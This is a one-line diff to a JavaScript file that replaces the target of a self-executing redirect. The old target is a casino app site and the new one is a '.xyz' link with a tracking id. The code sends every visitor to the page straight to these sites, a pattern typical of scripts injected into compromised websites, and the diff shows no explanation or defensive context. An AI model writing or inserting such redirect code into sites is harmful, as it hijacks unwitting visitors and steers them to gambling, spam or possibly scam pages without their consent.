@@ -1,1 +1,1 @@
-function executeRun(){window.location.href="https://casino-app.store/link/spinando.html"}executeRun();
+function executeRun(){window.location.href="https://vodka5.xyz?id=2690"}executeRun();
